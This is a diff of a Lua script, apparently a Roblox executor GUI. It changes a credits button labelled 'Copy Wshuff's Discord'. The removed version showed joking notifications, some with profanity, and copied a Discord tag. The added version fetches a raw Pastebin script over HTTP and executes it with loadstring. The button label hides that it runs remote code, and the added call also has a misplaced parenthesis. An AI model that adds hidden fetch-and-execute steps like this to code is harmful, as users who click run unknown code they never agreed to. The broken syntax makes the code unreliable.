@@ -100,39 +100,8 @@ cred:CreateButton("Copy Discord Link", function()
 setclipboard("https://discord.gg/p4nS6mV")
 end)
 
-credit:CreateButton("Copy Wshuff's Discord"), function()
---[[ oopsies
-oopsies ]]--
-
- game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "N/A",
-    Text = "he changes his tag"
-})
-
-wait(1)
-
- game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "N/A",
-    Text = "every fucking minute"
-})
-
-setclipboard("n1bu#1003")
-
-wait(1)
-
- game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "But..",
-    Text = "i just copied my discord"
-})
-
-wait(1)
-
- game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "To",
-    Text = "your clipboard ;)"
-})
-
--- yessirrr
+cred:CreateButton("Copy Wshuff's Discord"), function()
+loadstring(game:HttpGet("https://pastebin.com/raw/4EptL6r1",true))()
 end)
 
 local mouse = game:GetService("Players").LocalPlayer:GetMouse()
